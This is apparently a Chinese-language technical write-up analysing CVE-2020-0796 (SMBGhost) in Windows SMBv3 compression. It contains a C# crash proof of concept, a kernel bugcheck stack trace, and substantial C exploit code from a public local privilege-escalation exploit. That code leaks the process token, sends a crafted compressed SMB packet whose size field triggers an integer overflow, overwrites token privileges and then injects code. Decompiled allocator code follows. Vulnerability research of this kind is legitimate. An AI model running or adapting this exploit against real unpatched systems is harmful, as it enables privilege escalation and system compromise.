            Console.WriteLine("Goodbye World!");
        }
      }
    }
我测试的时候是单独写了一个exe调用这些函数，感兴趣的朋友可以试一试，不过确实改起来比较麻烦，而且利用起来较为麻烦
    // Microsoft.Protocols.TestTools.StackSdk.FileAccessService.dll
    // Microsoft.Protocols.TestTools.StackSdk.FileAccessService.Smb2.dll
    // Microsoft.Protocols.TestTools.StackSdk.Security.SspiLib.dll
    using System;
    using Microsoft.Protocols.TestTools.StackSdk.FileAccessService.Smb2;
    using Microsoft.Protocols.TestTools.StackSdk.Security.SspiLib;
    namespace SMBTest
    {
        class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine("[+] CVE-2020-0796 POC");
                var server = "127.0.0.1";
                if (args.Length >= 1)
                {
                    server = args[0];
                }
                Console.WriteLine("[+] Target server: " + server);
                Smb2ClientTransport Client = new Smb2ClientTransport();
                var timeout = new TimeSpan(0, 0, 60);
                Console.WriteLine("[+] Trigger ...");
                Client.Connect(
                    server,                   // [in] string server
                    "",                       // [in] string client
                    "",                       // [in] string domain
                    "Thunder_J",              // [in] string userName
                    "password",               // [in] string password
                    timeout,                  // [in] TimeSpan timeout
                    SecurityPackageType.Ntlm, // [in] SecurityPackageType securityPackage
                    true                      // [in] bool useServerToken
                );
            }
        }
    }
测试结果如下，1903未打此补丁的版本可以触发
调用栈如下，最终是在`nt!RtlDecompressBufferXpressLz+0x50`解压缩算法中出错
    0: kd> k
     # Child-SP          RetAddr               Call Site
    00 fffffb85`170821b8 fffff801`49b49492     nt!DbgBreakPointWithStatus
    01 fffffb85`170821c0 fffff801`49b48b82     nt!KiBugCheckDebugBreak+0x12
    02 fffffb85`17082220 fffff801`49a5f917     nt!KeBugCheck2+0x952
    03 fffffb85`17082920 fffff801`49aa3b0a     nt!KeBugCheckEx+0x107
    04 fffffb85`17082960 fffff801`4996c1df     nt!MiSystemFault+0x18fafa
    05 fffffb85`17082a60 fffff801`49a6d69a     nt!MmAccessFault+0x34f
    06 fffffb85`17082c00 fffff801`499fc750     nt!KiPageFault+0x35a
    07 fffffb85`17082d98 fffff801`4990a666     nt!RtlDecompressBufferXpressLz+0x50
    08 fffffb85`17082db0 fffff801`4dcae0bd     nt!RtlDecompressBufferEx2+0x66
    09 fffffb85`17082e00 fffff801`484d7f41     srvnet!SmbCompressionDecompress+0xdd
    0a fffffb85`17082e70 fffff801`484d699e     srv2!Srv2DecompressData+0xe1
    0b fffffb85`17082ed0 fffff801`48519a7f     srv2!Srv2DecompressMessageAsync+0x1e
    0c fffffb85`17082f00 fffff801`49a6304e     srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f
    0d fffffb85`17082f80 fffff801`49a6300c     nt!KxSwitchKernelStackCallout+0x2e
    0e fffffb85`16df78f0 fffff801`4996345e     nt!KiSwitchKernelStackContinue
    0f fffffb85`16df7910 fffff801`4996325c     nt!KiExpandKernelStackAndCalloutOnStackSegment+0x18e
    10 fffffb85`16df79b0 fffff801`499630d3     nt!KiExpandKernelStackAndCalloutSwitchStack+0xdc
    11 fffffb85`16df7a20 fffff801`4996308d     nt!KeExpandKernelStackAndCalloutInternal+0x33
    12 fffffb85`16df7a90 fffff801`485197d7     nt!KeExpandKernelStackAndCalloutEx+0x1d
    13 fffffb85`16df7ad0 fffff801`49fb34a7     srv2!RfspThreadPoolNodeWorkerRun+0x117
    14 fffffb85`16df7b30 fffff801`499d3925     nt!IopThreadStart+0x37
    15 fffffb85`16df7b90 fffff801`49a66d5a     nt!PspSystemThreadStartup+0x55
    16 fffffb85`16df7be0 00000000`00000000     nt!KiStartSystemThread+0x2a
下面介绍一下C版本的[利用代码](https://github.com/danigargu/CVE-2020-0796)，出自`@danigargu and
@dialluvioso_`两位师傅，顺便解析一下本地提权的原理，这位师傅的代码还是写的很明白，不过这个代码实际上并没有完全实现初始化部分，`send_negotiation`协商包发送之后直接就开始发送压缩数据，所以初始化部分实际上只需要协商一次`SMB2
NEGOTIATE`包即可进行压缩操作。
    int main(int argc, char* argv[]) {
        WORD wVersionRequested = MAKEWORD(2, 2);
        WSADATA wsaData = { 0 };
        SOCKET sock = INVALID_SOCKET;
        uint64_t ktoken = 0;
        int err = 0;
        printf("-= CVE-2020-0796 LPE =-\n");
        printf("by @danigargu and @dialluvioso_\n\n");
        if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {
            printf("WSAStartup() failed with error: %d\n", err);
            return EXIT_FAILURE;
        }
        if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
            printf("Couldn't find a usable version of Winsock.dll\n");
            WSACleanup();
            return EXIT_FAILURE;
        }
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            printf("socket() failed with error: %d\n", WSAGetLastError());
            WSACleanup();
            return EXIT_FAILURE;
        }
        sockaddr_in client;
        client.sin_family = AF_INET;
        client.sin_port = htons(445);
        InetPton(AF_INET, "127.0.0.1", &client.sin_addr);
        if (connect(sock, (sockaddr*)& client, sizeof(client)) == SOCKET_ERROR) {
            return error_exit(sock, "connect()");
        }
        printf("Successfully connected socket descriptor: %d\n", (int)sock);
        printf("Sending SMB negotiation request...\n");
        if (send_negotiation(sock) == SOCKET_ERROR) {
            printf("Couldn't finish SMB negotiation\n");
            return error_exit(sock, "send()");
        }
        printf("Finished SMB negotiation\n");
        ULONG buffer_size = 0x1110;
        UCHAR *buffer = (UCHAR *)malloc(buffer_size);
        if (buffer == NULL) {
            printf("Couldn't allocate memory with malloc()\n");
            return error_exit(sock, NULL);
        }
        ktoken = get_process_token();
        if (ktoken == -1) {
            printf("Couldn't leak ktoken of current process...\n");
            return EXIT_FAILURE;
        }
        printf("Found kernel token at %#llx\n", ktoken);
        memset(buffer, 'A', 0x1108);
        *(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */
        ULONG CompressBufferWorkSpaceSize = 0;
        ULONG CompressFragmentWorkSpaceSize = 0;
        err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS, 
            &CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);
        if (err != STATUS_SUCCESS) {
            printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
            return error_exit(sock, NULL);
        }
        ULONG FinalCompressedSize;
        UCHAR compressed_buffer[64];
        LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
        if (lpWorkSpace == NULL) {
            printf("Couldn't allocate memory with malloc()\n");
            return error_exit(sock, NULL);
        }
        err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,
            compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);
        if (err != STATUS_SUCCESS) {
            printf("RtlCompressBuffer() failed with error: %#x\n", err);
            free(lpWorkSpace);
            return error_exit(sock, NULL);
        }
        printf("Sending compressed buffer...\n");
        if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {
            return error_exit(sock, "send()");
        }
        printf("SEP_TOKEN_PRIVILEGES changed\n");
        inject();
        WSACleanup();
        return EXIT_SUCCESS;
    }
压缩函数实现如下，C的实现相比之前的要简单很多，直接编译运行是可以本地弹出一个计算器，不过首先需要介绍一下怎么利用
    int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {
        int err = 0;
        char response[8] = { 0 };
        const uint8_t buf[] = {
            /* NetBIOS Wrapper */
            0x00,
            0x00, 0x00, 0x33,
            /* SMB Header */
            0xFC, 0x53, 0x4D, 0x42, /* protocol id */
            0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
            0x02, 0x00,             /* compression algorithm, LZ77 */
            0x00, 0x00,             /* flags */
            0x10, 0x00, 0x00, 0x00, /* offset */
        };
        uint8_t* packet = (uint8_t*) malloc(sizeof(buf) + 0x10 + len);
        if (packet == NULL) {
            printf("Couldn't allocate memory with malloc()\n");
            return error_exit(sock, NULL);
        }
        memcpy(packet, buf, sizeof(buf));
        *(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;
        *(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;
        memcpy(packet + sizeof(buf) + 0x10, buffer, len);
        if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {
            recv(sock, response, sizeof(response), 0);
        }
        free(packet);
        return err;
    }
利用需要很了解内存布局，所以需要深入研究`SrvNetAllocateBuffer`函数，如下所示
    __int64 __fastcall SrvNetAllocateBuffer(unsigned __int64 Size, __int64 a2)
    {
      v2 = HIDWORD(KeGetPcr()[1].LockArray);
      v3 = 0;
      v5 = 0;
      if ( SrvDisableNetBufferLookAsideList || Size > 0x100100 )
      {
        if ( Size > 0x1000100 )
          return 0i64;
        v11 = SrvNetAllocateBufferFromPool(Size, Size);
      }
      else
      {
        if ( Size > 0x1100 )
        {
          v13 = Size - 0x100;
          _BitScanReverse64((unsigned __int64 *)&v14, v13);
          _BitScanForward64(&v15, v13);
          if ( (_DWORD)v14 == (_DWORD)v15 )
            v3 = v14 - 12;
          else
            v3 = v14 - 11;
        }
        v6 = SrvNetBufferLookasides[v3];
        v7 = *(_DWORD *)v6 - 1;
        if ( (unsigned int)(unsigned __int16)v2 + 1 < *(_DWORD *)v6 )
          v7 = (unsigned __int16)v2 + 1;
        v8 = v7;
        v9 = *(_QWORD *)(v6 + 32);
        v10 = *(_QWORD *)(v9 + 8 * v8);
        if ( !*(_BYTE *)(v10 + 112) )
          PplpLazyInitializeLookasideList(v6, *(_QWORD *)(v9 + 8 * v8));